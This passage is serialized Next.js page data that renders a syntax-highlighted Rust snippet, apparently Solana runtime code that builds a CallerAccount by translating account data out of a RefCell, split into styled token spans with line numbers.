rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\n92d:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\n92e:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n92f:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n930:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n931:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n932:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"serialized_data\"]}]\n933:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n934:[\"$\",\"span\",\"code-segment-83\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_data_addr\"]}]\n935:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n936:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" ref_to_len_in_vm\"]}]\n937:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n938:[\"$\",\"span\",\"code-segment-87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" serialized_len_ptr\"]}]\n939:[\"$\",\"span\",\"code-segment-88\",{\""])</script><script>self.__next_f.push([1,"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n93a:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n93b:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n93c:[\"$\",\"span\",\"code-segment-91\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n93d:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n93e:[\"$\",\"span\",\"code-segment-93\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n93f:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\n940:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n941:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Double translate data out of RefCell\"]}]\n942:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n943:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\n944:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n945:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n946:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data \"]}]\n947:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n948:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n949:[\"$\",\"span\",\"code-segment-10"])</script><script>self.__next_f.push([1,"4\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n94a:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"translate_type\"]}]\n94b:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n94c:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n94d:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n94e:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n94f:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n950:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\n951:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n952:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n953:[\"$\",\"span\",\"code-segment-114\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n954:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\n955:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            memory_mapping\"]}]\n956:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n957:[\"$\",\"span\",\"code-segment-118\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n958:[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,25"])</script><script>self.__next_f.push([1,"5,0.1)\",\"marginRight\":\"1em\"},\"children\":[15]}]\n959:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            account_info\"]}]\n95a:[\"$\",\"span\",\"code-segment-121\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n95b:[\"$\",\"span\",\"code-segment-122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\n95c:[\"$\",\"span\",\"code-segment-123\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n95d:[\"$\",\"span\",\"code-segment-124\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_ptr\"]}]\n95e:[\"$\",\"span\",\"code-segment-125\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n95f:[\"$\",\"span\",\"code-segment-126\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n960:[\"$\",\"span\",\"code-segment-127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n961:[\"$\",\"span\",\"code-segment-128\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n962:[\"$\",\"span\",\"code-segment-129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n963:[\"$\",\"span\",\"code-segment-130\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\n964:[\"$\",\"span\",\"code-segment-131\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\n965:[\"$\",\"span\",\"code-segment-132\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" _ \"]}]\n966:[\"$\",\"span\",\"code-segment-133\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n967:[\"$\",\"span\",\"code-segment-134\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n968:[\"$\",\"span\",\"code-segment-135\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n969:[\"$\",\"span\",\"code-segment-136\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n96a:[\"$\",\"span\",\"code-segment-137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n96b:[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWid"])</script><script>self.__next_f.push([1,"th\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[16]}]\n96c:[\"$\",\"span\",\"code-segment-139\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            invoke_context\"]}]\n96d:[\"$\",\"span\",\"code-segment-140\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n96e:[\"$\",\"span\",\"code-segment-141\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get_check_aligned\"]}]\n96f:[\"$\",\"span\",\"code-segment-142\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n970:[\"$\",\"span\",\"code-segment-143\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n971:[\"$\",\"span\",\"code-segment-144\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n972:[\"$\",\"span\",\"code-segment-145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n973:[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[17]}]\n974:[\"$\",\"span\",\"code-segment-147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n975:[\"$\",\"span\",\"code-segment-148\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n976:[\"$\",\"span\",\"code-segment-149\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\n977:[\"$\",\"span\",\"code-segment-150\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n978:[\"$\",\"span\",\"code-segment-151\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n979:[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\""])</script><script>self.__next_f.push([1,"1em\"},\"children\":[18]}]\n97a:[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[19]}]\n97b:[\"$\",\"span\",\"code-segment-155\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n97c:[\"$\",\"span\",\"code-segment-156\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n97d:[\"$\",\"span\",\"code-segment-157\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n97e:[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[20]}]\n97f:[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[21]}]\n980:[\"$\",\"span\",\"code-segment-161\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n981:[\"$\",\"span\",\"code-segment-162\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n982:[\"$\",\"span\",\"code-segment-163\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n983:[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[22]}]\n984:[\"$\",\"span\",\"code-segment-165\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            serialized_data\"]}]\n985:[\"$\",\"span\",\"code-segment-166\",{\"className\":\"token to"])</script><script>self.__next_f.push([1,"ken\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n986:[\"$\",\"span\",\"code-segment-167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n987:[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[23]}]\n988:[\"$\",\"span\",\"code-segment-169\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            vm_data_addr\"]}]\n989:[\"$\",\"span\",\"code-segment-170\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n98a:[\"$\",\"span\",\"code-segment-171\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n98b:[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[24]}]\n98c:[\"$\",\"span\",\"code-segment-173\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            ref_to_len_in_vm\"]}]\n98d:[\"$\",\"span\",\"code-segment-174\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n98e:[\"$\",\"span\",\"code-segment-175\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n98f:[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[25]}]\n990:[\"$\",\"span\",\"code-segment-177\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            serialized_len_ptr\"]}]\n991:[\"$\",\"span\",\"code-segment-178\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n992:[\"$\",\"span\",\"code-segment-179\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n993:[\"$\",\"span\",\"li"])</script><script>self.__next_f.push([1,"ne-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[26]}]\n994:[\"$\",\"span\",\"code-segment-181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n995:[\"$\",\"span\",\"code-segment-182\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n996:[\"$\",\"span\",\"code-segment-183\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n997:[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[27]}]\n998:[\"$\",\"span\",\"code-segment-185\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n999:[\"$\",\"span\",\"code-segment-186\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n99a:[\"$\",\"span\",\"code-segment-187\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n99b:[\"$\",\"span\",\"code-segment-188\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n99c:[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[28]}]\n99d:[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[29]}]\n99e:[\"$\",\"span\",\"code-segment-192\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n99f:[\"$\",\"span\",\"code-s"])</script><script>self.__next_f.push([1,"egment-193\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}]\n9a0:[\"$\",\"span\",\"code-segment-194\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n9a1:[\"$\",\"span\",\"code-segment-195\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}]\n9a2:[\"$\",\"span\",\"code-segment-196\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n9a3:[\"$\",\"span\",\"code-segment-197\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n9a4:[\"$\",\"span\",\"code-segment-198\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9a5:[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[30]}]\n9a6:[\"$\",\"span\",\"code-segment-200\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        vm_data_addr\"]}]\n9a7:[\"$\",\"span\",\"code-segment-201\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n9a8:[\"$\",\"span\",\"code-segment-202\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9a9:[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[31]}]\n9aa:[\"$\",\"span\",\"code-segment-204\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n9ab:[\"$\",\"span\",\"code-segment-205\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n9ac:[\"$\",\"span\",\"code-segment-206\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9ad:[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\""])</script><script>self.__next_f.push([1,",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[32]}]\n9ae:[\"$\",\"span\",\"code-segment-208\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n9af:[\"$\",\"span\",\"code-segment-209\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n9b0:[\"$\",\"span\",\"code-segment-210\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n9b1:[\"$\",\"span\",\"code-segment-211\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9b2:[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[33]}]\n9b3:[\"$\",\"span\",\"code-segment-213\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n9b4:[\"$\",\"span\",\"code-segment-214\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n9b5:[\"$\",\"span\",\"code-segment-23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n9b6:[\"$\",\"span\",\"code-segment-24\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"cell\"]}]\n9b7:[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n9b8:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\n9b9:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n9ba:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9bb:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n9bc:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n9bd:[\"$\",\"span\","])</script><script>self.__next_f.push([1,"\"code-segment-31\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n9be:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n9bf:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9c0:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n9c1:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n9c2:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"use\"]}]\n9c3:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n9c4:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"solana_program\"]}]\n9c5:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n9c6:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n9c7:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9c8:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n9c9:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n9ca:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"account_info\"]}]\n9cb:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n9cc:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Account"])</script><script>self.__next_f.push([1,"Info\"]}]\n9cd:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n9ce:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n9cf:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\n9d0:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n9d1:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"instruction\"]}]\n9d2:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token 